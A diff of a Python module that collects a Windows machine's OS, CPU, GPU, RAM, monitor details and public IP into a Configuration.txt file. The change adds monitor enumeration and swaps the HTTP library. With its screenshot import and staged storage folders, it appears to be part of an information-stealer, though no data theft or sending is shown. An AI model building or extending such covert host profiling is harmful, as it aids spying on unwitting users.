@@ -1,8 +1,10 @@
 from mss import mss
 from os import mkdir
 from win32com.client import GetObject
+from win32api import EnumDisplayMonitors, GetMonitorInfo
+from urllib.request import Request, urlopen
 
-from ..utils.config import http, SystemConfig
+from ..utils.config import SystemConfig
 
 
 class System:
@@ -35,9 +37,10 @@ class System:
             os_info = win.ExecQuery("Select * from Win32_OperatingSystem")[0]
             cpu_info = win.ExecQuery("Select * from Win32_Processor")[0].Name
             gpu_info = win.ExecQuery("Select * from Win32_VideoController")[0].Name
+            monitors_info = ", ".join(f"{monitor['Device'][4:]} {monitor['Monitor'][2]}x{monitor['Monitor'][3]}" for monitor in [GetMonitorInfo(monitor[0]) for monitor in EnumDisplayMonitors()])
 
             try:
-                net_info = http.request("GET", self.config.IPUrl).data.decode("utf-8")
+                net_info = urlopen(Request(method="GET", url=self.config.IPUrl)).read().decode("utf-8")
             except:
                 net_info = "Error"
 
@@ -46,9 +49,10 @@ class System:
                 f"IP: {net_info}\n",
                 f"OS Name: {os_info.Name.split('|')[0]}\n",
                 f"OS Version: {os_info.Version} {os_info.BuildNumber}\n",
+                f"Monitors: {monitors_info}\n"
                 f"CPU: {cpu_info}\n",
                 f"GPU: {gpu_info}\n",
-                f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
+                f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n",
             )
 
             with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Configuration.txt", "a", encoding="utf-8") as system:
